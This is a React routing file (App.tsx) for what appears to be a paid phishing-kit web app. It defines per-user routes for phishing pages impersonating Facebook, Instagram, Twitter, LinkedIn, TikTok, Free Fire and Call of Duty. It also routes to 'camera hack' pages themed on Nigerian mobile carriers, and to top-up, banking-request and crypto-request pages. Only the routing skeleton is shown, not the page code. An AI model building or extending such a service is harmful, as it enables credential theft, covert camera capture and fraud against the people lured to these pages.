
import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import Index from "./pages/Index";
import Register from "./pages/Register";
import Login from "./pages/Login";
import Dashboard from "./pages/Dashboard";
import Profile from "./pages/Profile";
import TopUp from "./pages/TopUp";
import Inbox from "./pages/Inbox";
import Phishing from "./pages/Phishing";
import CameraHack from "./pages/CameraHack";
import DownloadersTools from "./pages/DownloadersTools";
import GPT from "./pages/GPT";
import BankingRequest from "./pages/BankingRequest";
import CryptoRequest from "./pages/CryptoRequest";
import Admin from "./pages/Admin";
import NotFound from "./pages/NotFound";
import NotFoundError from "./pages/NotFoundError";

// Phishing Pages
import FacebookPhishing from "./pages/phishing/Facebook";
import InstagramPhishing from "./pages/phishing/Instagram";
import TwitterPhishing from "./pages/phishing/Twitter";
import LinkedInPhishing from "./pages/phishing/LinkedIn";
import TikTokPhishing from "./pages/phishing/TikTok";
import FreeFirePhishing from "./pages/phishing/FreeFire";
import CallOfDutyPhishing from "./pages/phishing/CallOfDuty";

// Camera Hack Pages
import MTNCameraHack from "./pages/camera/MTN";
import AirtelCameraHack from "./pages/camera/Airtel";
import GLOCameraHack from "./pages/camera/GLO";
import NineMobileCameraHack from "./pages/camera/NineMobile";

const queryClient = new QueryClient();

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<Index />} />
          <Route path="/register" element={<Register />} />
          <Route path="/login" element={<Login />} />
          <Route path="/dashboard" element={<Dashboard />} />
          <Route path="/profile" element={<Profile />} />
          <Route path="/topup" element={<TopUp />} />
          <Route path="/inbox" element={<Inbox />} />
          <Route path="/phishing" element={<Phishing />} />
          <Route path="/camera-hack" element={<CameraHack />} />
          <Route path="/downloaders-tools" element={<DownloadersTools />} />
          <Route path="/gpt" element={<GPT />} />
          <Route path="/banking-request" element={<BankingRequest />} />
          <Route path="/crypto-request" element={<CryptoRequest />} />
          <Route path="/admin" element={<Admin />} />
          
          {/* Phishing Pages */}
          <Route path="/phishing/facebook/:userId" element={<FacebookPhishing />} />
          <Route path="/phishing/instagram/:userId" element={<InstagramPhishing />} />
          <Route path="/phishing/twitter/:userId" element={<TwitterPhishing />} />
          <Route path="/phishing/linkedin/:userId" element={<LinkedInPhishing />} />
          <Route path="/phishing/tiktok/:userId" element={<TikTokPhishing />} />
          <Route path="/phishing/freefire/:userId" element={<FreeFirePhishing />} />
          <Route path="/phishing/callofduty/:userId" element={<CallOfDutyPhishing />} />
          
          {/* Camera Hack Pages */}
          <Route path="/cam/mtn/:userId" element={<MTNCameraHack />} />
          <Route path="/cam/airtel/:userId" element={<AirtelCameraHack />} />
          <Route path="/cam/glo/:userId" element={<GLOCameraHack />} />
          <Route path="/cam/9mobile/:userId" element={<NineMobileCameraHack />} />
          
          {/* 404 Pages */}
          <Route path="/404-not-found" element={<NotFoundError />} />
          
          {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
          <Route path="*" element={<NotFound />} />
        </Routes>
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
